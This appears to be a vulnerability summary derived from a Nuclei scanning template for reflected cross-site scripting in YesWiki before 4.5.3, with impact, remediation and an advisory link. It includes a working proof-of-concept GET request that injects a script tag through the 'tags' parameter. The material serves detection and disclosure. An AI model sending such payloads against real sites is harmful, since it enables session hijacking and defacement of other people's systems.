# Nuclei Template: YesWiki - Cross-Site Scripting
**Template ID:** yeswiki-reflected-xss
**Vulnerability Class:** Cross-site Scripting (XSS) - Generic
**Severity:** High
**Source:** Nuclei Template (`yeswiki-reflected-xss.yaml`)

## Vulnerability Information & PoC

## Description
YesWiki versions < 4.5.3 are vulnerable to multiple reflected cross-site scripting (XSS) vulnerabilities, allowing arbitrary JavaScript execution.

## Impact
Attackers can steal cookies, hijack user sessions, deface websites, or embed malicious content.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/?PagePrincipale/listpages&tags=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E
```

## Remediation
Upgrade to YesWiki version 4.6.0 or later.

## References
- https://github.com/YesWiki/yeswiki/security/advisories/GHSA-5724-x3rh-5qqq
